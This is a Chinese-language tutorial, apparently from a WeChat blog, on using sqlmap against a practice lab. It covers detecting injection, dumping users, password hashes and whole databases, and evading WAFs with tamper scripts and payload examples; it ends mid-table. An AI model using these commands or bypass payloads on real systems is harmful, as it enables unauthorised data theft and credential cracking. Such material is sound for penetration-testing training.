> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s?__biz=MzI2NDQyNzg1OA==&mid=2247483738&idx=1&sn=c0442d00d01d3b69b2d762c62121364e&chksm=eaad8167ddda08715176bf006d31a470b56d010283d642739265ceb39b195257bcff569ea0a7&scene=21#wechat_redirect)

02

工具使用 | Sqlmap 使用详解

![](https://mmbiz.qpic.cn/mmbiz_gif/rSyd2cclv2dFib5g1fbicqX8MgAr9JCHUzcbc55FXlenqyBiahUBokG3ib7pPQBfhRaXicaAtHwQtgvLnzq5Jibh0bXg/640?wx_fmt=gif)

目录  

Sqlmap

Sqlmap 的简单用法

探测指定 URL 是否存在 SQL 注入漏洞

查看数据库的所有用户

查看数据库所有用户名的密码 

查看数据库当前用户 

判断当前用户是否有管理权限

列出数据库管理员角色

查看所有的数据库

查看当前的数据库

爆出指定数据库中的所有的表 

爆出指定数据库指定表中的所有的列

爆出指定数据库指定表指定列下的数据

爆出该网站数据库中的所有数据

Sqlmap 的高级用法

探测指定 URL 是否存在 WAF，并且绕过

指定脚本进行绕过

 探测等级和危险等级

伪造 Http Referer 头部

执行指定的 SQL 语句

执行操作系统命令

从数据库中读取文件

上传文件到数据库服务器中

![](https://mmbiz.qpic.cn/mmbiz_gif/rSyd2cclv2dFib5g1fbicqX8MgAr9JCHUzzYRJsCdcSUSWq8zqhYeKW2BuMCLfIfBichUrPUTd8mYVr3lBJJkFibNg/640?wx_fmt=gif)

Sqlmap
------

**Sqlmap** 是一个自动化的 SQL 注入工具，其主要功能是扫描，发现并利用给定的 URL 进行 SQL 注入。目前支持的数据库有 MySql、Oracle、Access、PostageSQL、SQL Server、IBM DB2、SQLite、Firebird、Sybase 和 SAP MaxDB 等

Sqlmap 采用了以下 5 种独特的 SQL 注入技术

*   基于布尔类型的盲注，即可以根据返回页面判断条件真假的注入
    
*   基于时间的盲注，即不能根据页面返回的内容判断任何信息，要用条件语句查看时间延迟语句是否已经执行 (即页面返回时间是否增加) 来判断
    
*   基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回到页面中
    
*   联合查询注入，在可以使用 Union 的情况下注入
    
*   堆查询注入，可以同时执行多条语句时的注入
    

Sqlmap 的强大的功能包括 数据库指纹识别、数据库枚举、数据提取、访问目标文件系统，并在获取完全的操作权限时执行任意命令。

sqlmap 是一个跨平台的工具，很好用，是 SQL 注入方面一个强大的工具！

我们可以使用 -h 参数查看 sqlmap 的参数以及用法，**sqlmap  -h**

Sqlmap 的简单用法
------------

![](https://mmbiz.qpic.cn/mmbiz_gif/rSyd2cclv2dFib5g1fbicqX8MgAr9JCHUz26dR3nxqfZmSEbs3ibLUNDK79NxHHFAutHOgjMbchnXzLuakuHtIaRA/640?wx_fmt=gif)

探测是定 URL 是否存在 SQL 注入漏洞  

  

**对于不用登录的网站**，直接指定其 URL  

在探测目标 URL 是否存在漏洞的过程中，Sqlmap 会和我们进行交互。

比如第一处交互的地方是说这个目标系统的数据库好像是 Mysql 数据库，是否还探测其他类型的数据库。我们选择 n，就不探测其他类型的数据库了，因为我们已经知道目标系统是 Mysql 数据库了。

第二处交互的地方是说 对于剩下的测试，问我们是否想要使用扩展提供的级别 (1) 和风险 (1) 值的 “MySQL” 的所有测试吗？ 我们选择 y。

第三处交互是说已经探测到参数 id 存在漏洞了，是否还探测其他地方，我们选择 n 不探测其他参数了 。

最后 sqlmap 就列出了参数 id 存在的注入类型是 boolean 盲注，还有 payload 其他信息也显示出来了，最后还列出了目标系统的版本，php，apache 等信息。

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2dFib5g1fbicqX8MgAr9JCHUzWQOvWBdBYibab9YsUicKSahvhzB5ia52lvPb6wbmfMaPZib94xud51SX6A/640?wx_fmt=png)

这次探测的所有数据都被保存在了 **/root/.sqlmap/output/192.168.10.1/** 目录下  

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2dFib5g1fbicqX8MgAr9JCHUzX3gvGDfxI5pP51bQlWlAWFjWTdIDjHHy1iayOEkbiaoTHjChhiayaOrGw/640?wx_fmt=png)

**对于需要登录的网站**，我们需要指定其 cookie  。我们可以用账号密码登录，然后用抓包工具抓取其 cookie 填入  

**对于是 post 提交数据的 URL**，我们需要指定其 data 参数  

```
"http://192.168.10.1/sqli/Less-11/?id=1" --data="u  #抓取其post提交的数据填入
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2dFib5g1fbicqX8MgAr9JCHUz7kHIDol85grUQEIXQicewGkROBMIf8yRvWIoiaYQ9hEFYPWRGguEEYgQ/640?wx_fmt=png)

**我们也可以通过抓取 http 数据包保存为文件**，然后指定该文件即可。这样，我们就可以不用指定其他参数，这对于需要登录的网站或者 post 提交数据的网站很方便。我们抓取了一个 post 提交数据的数据包保存为 post.txt，如下，uname 参数和 passwd 参数存在 SQL 注入漏洞  

  
       POST /sqli/Less-11/ HTTP/1.1

1.  Host: 192.168.10.1
    
2.  User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
    
3.  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    
4.  Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
    
5.  Content-Type: application/x-www-form-urlencoded
    
6.  Content-Length: 38
    
7.  Referer: http://192.168.10.1/sqli/Less-11/
    
8.  Connection: close
    
9.  Upgrade-Insecure-Requests: 1
    
10.  uname=admin&passwd=admin&submit=Submit
    

然后我们可以指定这个数据包进行探测  

sqlmap -r post.txt  #探测 post.txt 文件中的 http 数据包是否存在 sql 注入漏洞  

他也会和我们进行交互，询问我们，这里就不一一解释了 

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2dFib5g1fbicqX8MgAr9JCHUzzjVFsG9PkNiciaQCBojGpvibdyQTCHPE4KmwGudZ4urFFUV0wra6M0WRA/640?wx_fmt=png)

可以看到，已经探测到 uname 参数存在漏洞了，问我们是否还想探测其他参数，我们选择的 y ，它检测到 passwd 也存在漏洞了，问我们是否还想探测其他参数，我们选择 n

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2dFib5g1fbicqX8MgAr9JCHUzHRsFpPUwWeynE5SlTYUR9EbV76nEmjtWZKCuiawhTYUEYNo61siahpAw/640?wx_fmt=png)

然后会让我们选择，在后续的测试中，是选择 uname 这个参数还是 passwd 这个参数作为漏洞，随便选择一个就好了。

查看数据库的用户  

**对于不用登录的网站**，直接指定其 URL  

```
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --users #查看数据库的所有用户
```

### ![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2dFib5g1fbicqX8MgAr9JCHUzfAfAVqk0nEsno0jHUGVfxx5Whiax2icpdcVmBCPfosII3kQfRJcMxctA/640?wx_fmt=png)

查看数据库下所有用户名密码  

```
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --passwords #查看数据库用户名的密码
```

第一处询问我们是否保存密码的 hash 值为文件，我们不保存。第二处问我们是否使用 sqlmap 自带的字典进行爆破，我们选择 y，可以看出把密码爆破出来了，root 用户的密码也为 root。如果这里爆破不出来，我们可以拿 hash 值去字典更强大的地方爆破

### ![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2dFib5g1fbicqX8MgAr9JCHUzK36UzwT9icymicNIrYrO6eqqrGnPMibSWP8YaIZFsmah9SrIUXjTXaB4g/640?wx_fmt=png)

查看当前数据库用户  

```
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --current-user  #查看数据库当前的用户
```

### ![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2dFib5g1fbicqX8MgAr9JCHUz4vNy5vwPxe0AXhZFmPRcVBiaoRx0XibMk1HziafqcAyMicyNFnjMJEuoAQ/640?wx_fmt=png)  

判断当前用户是否有管理权限  

查看当前账户是否为数据库管理员账户

```
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --is-dba  #判断当前用户是否有管理员权限
```

### ![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2dFib5g1fbicqX8MgAr9JCHUzB4mibTlv5DyYicyV3zzeXoibPXSEqnekT6wmqdqQr78MhMSniaIzW8dczQ/640?wx_fmt=png)

列出数据库管理员角色  

```
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --roles   #列出数据库所有管理员角色
```

### ![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2dFib5g1fbicqX8MgAr9JCHUzRnMjVmtF80WxcAZalpUibxbjMVngMucu1Yep8XK5hFvzxZtsXzGsyaw/640?wx_fmt=png)

查看当前数据库  

```
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --dbs
```

### ![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2dFib5g1fbicqX8MgAr9JCHUzAic4475RMzb6AISVoAlAsbjTRgfOpRPWzjdtnhjQJemOR8foSLOWQwQ/640?wx_fmt=png)  

查看当前数据库  

```
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --current-db #查看当前的数据库
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2dFib5g1fbicqX8MgAr9JCHUz93YG9FJYTZgShkwk2dBrTksfCl8DJIdVlKkhs4EEQwAarQXAp70sicg/640?wx_fmt=png)

查看数据库中所有的表  

```
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security --tables #爆出数据库security中的所有的表
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2dFib5g1fbicqX8MgAr9JCHUznSG7m0VpA4HmDFGtcmCYOv1Y3o4OyhYQtzc16Pw5o5Bmrapzw1XOlg/640?wx_fmt=png)

爆出指定数据库中指定表的所有列  

```
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security -T users --columns
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2dFib5g1fbicqX8MgAr9JCHUzNsgh6FZCTuuHMCibtkWPbicPBciaTa58eN64ia0hIA7cmsmFlS0ibichQtUw/640?wx_fmt=png)

爆出指定数据库指定列下的数据  

```
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security -T users -C username --dump  #爆出数据库security中的users表中的username列中的所有数据
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2dFib5g1fbicqX8MgAr9JCHUz0FwNsiccouibKtjVOK6KM96E3gAgFq4ynl81VaQCCZF7lRu9zfk1qlFA/640?wx_fmt=png)

爆出该网站数据库中的所有数据  

```
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security -T users --dump-all #爆出数据库security中的users表中的所有数据

sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security --dump-all   #爆出数据库security中的所有数据

sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --dump-all  #爆出该数据库中的所有数据
```

1

![](https://mmbiz.qpic.cn/mmbiz_png/Ljib4So7yuWhHeG4dvLoxYm34O9ebCiby2Mjn5AqPQ3ZEgJtV2YxyovibQUw1Jxd5zan3T0BqiaUyDzticNfV5xxPeg/640?wx_fmt=png)

  

Sqlmap 的高级用法
------------

Sqlmap 在默认情况下除了适用 CHAR() 函数防止出现单引号，没有对注入的数据进行修改。我们可以使用 --tamper 参数对数据进行修改来绕过 WAF 等设备，其中的大部分脚本主要用正则模块替换攻击载荷字符编码的方式尝试绕过 WAF 的检测规则。Sqlmap 目前官方提供 53 个绕过脚本。

### 探测指定 URL 是否存在 WAF，并且绕过

```
--identify-waf   检测是否有WAF

#使用参数进行绕过

--random-agent    使用任意HTTP头进行绕过，尤其是在WAF配置不当的时候

--time-sec=3      使用长的延时来避免触发WAF的机制，这方式比较耗时

--hpp             使用HTTP 参数污染进行绕过，尤其是在ASP.NET/IIS 平台上

--proxy=100.100.100.100:8080 --proxy-cred=211:985      使用代理进行绕过

--ignore-proxy    禁止使用系统的代理，直接连接进行注入

--flush-session   清空会话，重构注入

--hex 或者 --no-cast     进行字符码转换

--mobile          对移动端的服务器进行注入

--tor             匿名注入
```

### 指定脚本进行绕过

有些时候网站会过滤掉各种字符，可以用 tamper 来解决（对付某些 waf 时也有成效）

```
sqlmap  --tamper=space2comment.py  #用/**/代替空格

sqlmap  --tamper="space2comment.py,space2plus.py"  指定多个脚本进行过滤
```

 过滤脚本在目录：**/usr/share/sqlmap/tamper**

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2dFib5g1fbicqX8MgAr9JCHUzn7DfLmicPmGHp873fNxVE9172ubc7ibUsG5TCynWicdtttxedxnkjAxrQ/640?wx_fmt=png)

过滤脚本在目录：**/usr/share/sqlmap/tamper**

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2dFib5g1fbicqX8MgAr9JCHUzn7DfLmicPmGHp873fNxVE9172ubc7ibUsG5TCynWicdtttxedxnkjAxrQ/640?wx_fmt=png)

 过滤脚本在目录：**/usr/share/sqlmap/tamper**

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2dFib5g1fbicqX8MgAr9JCHUzn7DfLmicPmGHp873fNxVE9172ubc7ibUsG5TCynWicdtttxedxnkjAxrQ/640?wx_fmt=png)

<table cellspacing="0"><tbody><tr><td width="34" height="67"><strong>支持的数据库</strong></td><td width="23" height="67"><strong>编号</strong></td><td width="129" height="67"><strong>脚本名称</strong></td><td width="5" height="67"><strong>作用</strong><br></td><td width="111" height="67"><strong>实现方式</strong></td><td width="101" height="67"><strong>测试通过的数据库类型和版本</strong></td></tr><tr><td rowspan="8" width="64">ALL</td><td width="18"><strong>1</strong></td><td width="147">apostrophemask.py</td><td width="5">用 utf8 代替引号</td><td width="218">("1&nbsp;AND'1'='1")&nbsp;<br>'1&nbsp;AND&nbsp;%EF%BC%871%EF%BC%87=%EF%BC%871'&nbsp;</td><td width="101"><br></td></tr><tr><td width="21"><strong>2</strong></td><td width="69">base64encode.py&nbsp;</td><td width="227">用 base64 编码替换</td><td width="50">("1'&nbsp;AND&nbsp;SLEEP(5)#")<br>'MScgQU5EIFNMRUVQKDUpIw=='<br>&nbsp;</td><td width="201"><br></td></tr><tr><td width="21"><strong>3</strong></td><td width="69">multiplespaces.py</td><td width="227">围绕 SQL 关键字添加多个空格</td><td width="50">('1&nbsp;UNION&nbsp;SELECT&nbsp;foobar')<br>'1&nbsp;&nbsp;&nbsp;&nbsp;UNION&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SELECT&nbsp;&nbsp;&nbsp;foobar'</td><td width="201"><br></td></tr><tr><td width="21"><strong>4</strong></td><td width="69">space2plus.py</td><td width="227">用 + 替换空格</td><td width="50">('SELECT&nbsp;id&nbsp;FROM&nbsp;users')<br>'SELECT+id+FROM+users'</td><td width="201"><br></td></tr><tr><td width="21"><strong>5</strong></td><td width="69">nonrecursivereplacement.py</td><td width="227">双重查询语句。取代 predefined SQL 关键字 with 表示&nbsp;<br>suitable&nbsp;for 替代（例如&nbsp;&nbsp;.replace（“SELECT”、”")）&nbsp;filters</td><td width="50">('1&nbsp;UNION&nbsp;SELECT&nbsp;2--')<br>'1&nbsp;UNIOUNIONN&nbsp;SELESELECTCT&nbsp;2--'</td><td width="201"><br></td></tr><tr><td width="21"><strong>6</strong></td><td width="69">space2randomblank.py</td><td width="227">代替空格字符（“”）从一个随机的空<br>白字符可选字符的有效集</td><td width="50">('SELECT&nbsp;id&nbsp;FROM&nbsp;users')<br>'SELECT%0Did%0DFROM%0Ausers'</td><td width="201"><br></td></tr><tr><td width="21"><strong>7</strong></td><td width="69">unionalltounion.py</td><td width="227">替换 UNION&nbsp;ALL&nbsp;SELECT&nbsp;UNION&nbsp;SELECT</td><td width="50">('-1&nbsp;UNION&nbsp;ALL&nbsp;SELECT')<br>'-1&nbsp;UNION&nbsp;SELECT'</td><td width="201"><br></td></tr><tr><td width="21"><strong>8</strong></td><td width="69">securesphere.py</td><td width="227">追加特制的字符串</td><td width="50">('1&nbsp;AND&nbsp;1=1')<br>"1&nbsp;AND&nbsp;1=1&nbsp;and'0having'='0having'"</td><td width="201"><br></td></tr><tr><td rowspan="11" width="64">MSSQL</td><td width="18"><strong>1</strong></td><td width="147">space2hash.py</td><td width="5">绕过过滤‘=’&nbsp;替换空格字符（”），（’&nbsp;–&nbsp;‘）后跟一个破折号注释，一个随机字符串和一个新行（’&nbsp;n’）</td><td width="218"><br>'1&nbsp;AND&nbsp;9227=9227'&nbsp;<br>'1--nVNaVoPYeva%0AAND--ngNvzqu%0A9227=9227'&nbsp;</td><td width="101"><br></td></tr><tr><td width="21"><strong>2</strong></td><td width="69">equaltolike.py</td><td width="227">like&nbsp;代替等号</td><td width="50"><br>*&nbsp;Input:&nbsp;SELECT&nbsp;*&nbsp;FROM&nbsp;users&nbsp;WHERE&nbsp;id=1&nbsp;<br>2&nbsp;*&nbsp;Output:&nbsp;SELECT&nbsp;*&nbsp;FROM&nbsp;users&nbsp;WHERE&nbsp;id&nbsp;LIKE&nbsp;1&nbsp;</td><td width="201"><br></td></tr><tr><td width="21"><strong>3</strong></td><td width="69">space2mssqlblank.py(mssql)</td><td width="227">空格替换为其它空符号</td><td width="50">Input:&nbsp;SELECT&nbsp;id&nbsp;FROM&nbsp;users<br>Output:&nbsp;SELECT%08id%02FROM%0Fusers</td><td width="201">*&nbsp;Microsoft&nbsp;SQL&nbsp;Server&nbsp;2000<br>*&nbsp;Microsoft&nbsp;SQL&nbsp;Server&nbsp;2005</td></tr><tr><td width="21"><strong>4</strong></td><td width="69">space2mssqlhash.py</td><td width="227">替换空格</td><td width="50">('1&nbsp;AND&nbsp;9227=9227')<br>'1%23%0AAND%23%0A9227=9227'</td><td width="201"><br></td></tr><tr><td width="21"><strong>5</strong></td><td width="69">between.py</td><td width="227">用 between 替换大于号（&gt;）</td><td width="50">('1&nbsp;AND&nbsp;A&gt;&nbsp;B--')<br>'1&nbsp;AND&nbsp;A&nbsp;NOT&nbsp;BETWEEN&nbsp;0&nbsp;AND&nbsp;B--'</td><td width="201"><br></td></tr><tr><td width="21"><strong>6</strong></td><td width="69">percentage.py</td><td width="227">asp 允许每个字符前面添加一个 % 号</td><td width="50">*&nbsp;Input:&nbsp;SELECT&nbsp;FIELD&nbsp;FROM&nbsp;TABLE<br>*&nbsp;Output:&nbsp;%S%E%L%E%C%T&nbsp;%F%I%E%L%D&nbsp;%F%R%O%M&nbsp;%T%A%B%L%E<br>&nbsp;</td><td width="201"><br></td></tr><tr><td width="21"><strong>7</strong></td><td width="69">sp_password.py</td><td width="227">追加 sp_password’从 DBMS 日志的自动模糊处理的有效载荷的末尾</td><td width="50">('1&nbsp;AND&nbsp;9227=9227--')<br>'1&nbsp;AND&nbsp;9227=9227--&nbsp;sp_password'</td><td width="201"><br></td></tr><tr><td width="21"><strong>8</strong></td><td width="69">charencode.py</td><td width="227">url 编码</td><td width="50">*&nbsp;Input:&nbsp;SELECT&nbsp;FIELD&nbsp;FROM%20TABLE<br>*&nbsp;Output:&nbsp;%53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45</td><td width="201"><br></td></tr><tr><td width="21"><strong>9</strong></td><td width="69">randomcase.py</td><td width="227">随机大小写</td><td width="50">*&nbsp;Input:&nbsp;INSERT<br>*&nbsp;Output:&nbsp;InsERt</td><td width="201"><br></td></tr><tr><td width="21"><strong>10</strong></td><td width="69">charunicodeencode.py</td><td width="227">字符串&nbsp;unicode&nbsp;编码</td><td width="50">*&nbsp;Input:&nbsp;SELECT&nbsp;FIELD%20FROM&nbsp;TABLE<br>*&nbsp;Output:&nbsp;%u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′</td><td width="201"><br></td></tr><tr><td width="21"><strong>11</strong></td><td width="69">space2comment.py</td><td width="227">Replaces&nbsp;space&nbsp;character&nbsp;(‘&nbsp;‘)&nbsp;with&nbsp;comments&nbsp;‘/**/’</td><td width="50">*&nbsp;Input:&nbsp;SELECT&nbsp;id&nbsp;FROM&nbsp;users<br>*&nbsp;Output:&nbsp;SELECT//id//FROM/**/users</td><td width="201"><br></td></tr><tr><td rowspan="18" width="64">MYSQL</td><td width="18"><strong>1</strong></td><td width="147">equaltolike.py</td><td width="5">like&nbsp;代替等号</td><td width="218"><br>*&nbsp;Input:&nbsp;SELECT&nbsp;*&nbsp;FROM&nbsp;users&nbsp;WHERE&nbsp;id=1&nbsp;<br>2&nbsp;*&nbsp;Output:&nbsp;SELECT&nbsp;*&nbsp;FROM&nbsp;users&nbsp;WHERE&nbsp;id&nbsp;LIKE&nbsp;1&nbsp;</td><td width="101">&nbsp;Microsoft&nbsp;SQL&nbsp;Server&nbsp;2005<br>MySQL&nbsp;4,&nbsp;5.0&nbsp;and&nbsp;5.5</td></tr><tr><td width="21"><strong>2</strong></td><td width="69">greatest.py</td><td width="227">绕过过滤’&gt;’&nbsp;, 用 GREATEST 替换大于号。</td><td width="50">('1&nbsp;AND&nbsp;A&gt;&nbsp;B')<br>'1&nbsp;AND&nbsp;GREATEST(A,B+1)=A'</td><td width="201">*&nbsp;MySQL&nbsp;4,&nbsp;5.0&nbsp;and&nbsp;5.5<br>*&nbsp;Oracle&nbsp;10g<br>*&nbsp;PostgreSQL&nbsp;8.3,&nbsp;8.4,&nbsp;9.0</td></tr><tr><td width="21"><strong>3</strong></td><td width="69">apostrophenullencode.py</td><td width="227">绕过过滤双引号，替换字符和双引号。</td><td width="50">tamper("1&nbsp;AND'1'='1")<br>'1&nbsp;AND&nbsp;%00%271%00%27=%00%271'</td><td width="201">*&nbsp;MySQL&nbsp;4,&nbsp;5.0&nbsp;and&nbsp;5.5<br>*&nbsp;Oracle&nbsp;10g<br>*&nbsp;PostgreSQL&nbsp;8.3,&nbsp;8.4,&nbsp;9.0</td></tr><tr><td width="21"><strong>4</strong></td><td width="69">ifnull2ifisnull.py</td><td width="227">绕过对 IFNULL 过滤。<br>替换类似’IFNULL(A,&nbsp;B)’为’IF(ISNULL(A),&nbsp;B,&nbsp;A)’</td><td width="50">('IFNULL(1,&nbsp;2)')<br>'IF(ISNULL(1),2,1)'</td><td width="201">*&nbsp;MySQL&nbsp;5.0&nbsp;and&nbsp;5.5</td></tr><tr><td width="21"><strong>5</strong></td><td width="69">space2mssqlhash.py</td><td width="227">替换空格</td><td width="50">('1&nbsp;AND&nbsp;9227=9227')<br>'1%23%0AAND%23%0A9227=9227'</td><td width="201"><br></td></tr><tr><td width="21"><strong>6</strong></td><td width="69">modsecurityversioned.py</td><td width="227">过滤空格，包含完整的查询版本注释</td><td width="50">('1&nbsp;AND&nbsp;2&gt;1--')<br>'1&nbsp;/*!30874AND&nbsp;2&gt;1*/--'<br>&nbsp;</td><td width="201">*&nbsp;MySQL&nbsp;5.0</td></tr><tr><td width="21"><strong>7</strong></td><td width="69">space2mysqlblank.py</td><td width="227">空格替换其它空白符号 (mysql)</td><td width="50">Input:&nbsp;SELECT&nbsp;id&nbsp;FROM&nbsp;users<br>Output:&nbsp;SELECT%0Bid%0BFROM%A0users</td><td width="201">*&nbsp;MySQL&nbsp;5.1</td></tr><tr><td width="21"><strong>8</strong></td><td width="69">between.py</td><td width="227">用 between 替换大于号（&gt;）</td><td width="50">('1&nbsp;AND&nbsp;A&gt;&nbsp;B--')<br>'1&nbsp;AND&nbsp;A&nbsp;NOT&nbsp;BETWEEN&nbsp;0&nbsp;AND&nbsp;B--'</td><td width="201">*&nbsp;Microsoft&nbsp;SQL&nbsp;Server&nbsp;2005<br>*&nbsp;MySQL&nbsp;4,&nbsp;5.0&nbsp;and&nbsp;5.5<br>*&nbsp;Oracle&nbsp;10g<br>*&nbsp;PostgreSQL&nbsp;8.3,&nbsp;8.4,&nbsp;9.0</td></tr><tr><td width="21"><strong>9</strong></td><td width="69">modsecurityzeroversioned.py</td><td width="227">包含了完整的查询与零版本注释</td><td width="50">('1&nbsp;AND&nbsp;2&gt;1--')<br>'1&nbsp;/*!00000AND&nbsp;2&gt;1*/--'<br>&nbsp;</td><td width="201">*&nbsp;MySQL&nbsp;5.0</td></tr><tr><td width="21"><strong>10</strong></td><td width="69">space2mysqldash.py</td><td width="227">替换空格字符（”）（’&nbsp;–&nbsp;‘）后跟一个破折号注释一个新行（’&nbsp;n’）</td><td width="50">('1&nbsp;AND&nbsp;9227=9227')<br>'1--%0AAND--%0A9227=9227'</td><td width="201"><br></td></tr><tr><td width="21"><strong>11</strong></td><td width="69">bluecoat.py</td><td width="227">代替空格字符后与一个有效的随机空白字符的 SQL 语句。<br>然后替换 = 为 like</td><td width="50">('SELECT&nbsp;id&nbsp;FROM&nbsp;users&nbsp;where&nbsp;id&nbsp;=&nbsp;1')<br>'SELECT%09id&nbsp;FROM&nbsp;users&nbsp;where&nbsp;id&nbsp;LIKE&nbsp;1'</td><td width="201">*&nbsp;MySQL&nbsp;5.1,&nbsp;SGOS</td></tr><tr><td width="21"><strong>12</strong></td><td width="69">percentage.py</td><td width="227">asp 允许每个字符前面添加一个 % 号</td><td width="50">*&nbsp;Input:&nbsp;SELECT&nbsp;FIELD&nbsp;FROM&nbsp;TABLE<br>*&nbsp;Output:&nbsp;%S%E%L%E%C%T&nbsp;%F%I%E%L%D&nbsp;%F%R%O%M&nbsp;%T%A%B%L%E<br>&nbsp;</td><td width="201">*&nbsp;Microsoft&nbsp;SQL&nbsp;Server&nbsp;2000,&nbsp;2005<br>*&nbsp;MySQL&nbsp;5.1.56,&nbsp;5.5.11<br>*&nbsp;PostgreSQL&nbsp;9.0</td></tr><tr><td width="21"><strong>13</strong></td><td width="69">charencode.py</td><td width="227">url 编码</td><td width="50">*&nbsp;Input:&nbsp;SELECT&nbsp;FIELD&nbsp;FROM%20TABLE<br>*&nbsp;Output:&nbsp;%53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45</td><td width="201">*&nbsp;Microsoft&nbsp;SQL&nbsp;Server&nbsp;2005<br>*&nbsp;MySQL&nbsp;4,&nbsp;5.0&nbsp;and&nbsp;5.5<br>*&nbsp;Oracle&nbsp;10g<br>*&nbsp;PostgreSQL&nbsp;8.3,&nbsp;8.4,&nbsp;9.0</td></tr><tr><td width="21"><strong>14</strong></td><td width="69">randomcase.py</td><td width="227">随机大小写</td><td width="50">*&nbsp;Input:&nbsp;INSERT<br>*&nbsp;Output:&nbsp;InsERt</td><td width="201">*&nbsp;Microsoft&nbsp;SQL&nbsp;Server&nbsp;2005<br>*&nbsp;MySQL&nbsp;4,&nbsp;5.0&nbsp;and&nbsp;5.5<br>*&nbsp;Oracle&nbsp;10g<br>*&nbsp;PostgreSQL&nbsp;8.3,&nbsp;8.4,&nbsp;9.0</td></tr><tr><td width="21"><strong>15</strong></td><td width="69">versionedkeywords.py</td><td width="227">Encloses&nbsp;each&nbsp;non-function&nbsp;keyword&nbsp;with&nbsp;versioned&nbsp;MySQL&nbsp;comment</td><td width="50">*&nbsp;Input:&nbsp;1&nbsp;UNION&nbsp;ALL&nbsp;SELECT&nbsp;NULL,&nbsp;NULL,&nbsp;CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()&nbsp;AS&nbsp;CHAR),CHAR(32)),CHAR(58,100,114,117,58))#<br>*&nbsp;Output:&nbsp;1/*!UNION**!ALL**!SELECT**!NULL*/,/*!NULL*/,&nbsp;CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/*!AS**!CHAR*/),CHAR(32)),CHAR(58,100,114,117,58))#</td><td width="201"><br></td></tr><tr><td width="21"><strong>16</strong></td><td width="69">space2comment.py</td><td width="227">Replaces&nbsp;space&nbsp;character&nbsp;(‘&nbsp;‘)&nbsp;with&nbsp;comments&nbsp;‘/**/’</td><td width="50">*&nbsp;Input:&nbsp;SELECT&nbsp;id&nbsp;FROM&nbsp;users<br>*&nbsp;Output:&nbsp;SELECT//id//FROM/**/users</td><td width="201">*&nbsp;Microsoft&nbsp;SQL&nbsp;Server&nbsp;2005<br>*&nbsp;MySQL&nbsp;4,&nbsp;5.0&nbsp;and&nbsp;5.5<br>*&nbsp;Oracle&nbsp;10g<br>*&nbsp;PostgreSQL&nbsp;8.3,&nbsp;8.4,&nbsp;9.0</td></tr><tr><td width="21"><strong>17</strong></td><td width="69">charunicodeencode.py</td><td width="227">字符串&nbsp;unicode&nbsp;编码</td><td width="50">*&nbsp;Input:&nbsp;SELECT&nbsp;FIELD%20FROM&nbsp;TABLE<br>*&nbsp;Output:&nbsp;%u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′</td><td width="201">*&nbsp;Microsoft&nbsp;SQL&nbsp;Server&nbsp;2000<br>*&nbsp;Microsoft&nbsp;SQL&nbsp;Server&nbsp;2005<br>*&nbsp;MySQL&nbsp;5.1.56<br>*&nbsp;PostgreSQL&nbsp;9.0.3</td></tr><tr><td width="21"><strong>18</strong></td><td width="69">versionedmorekeywords.py</td><td width="227">注释绕过</td><td 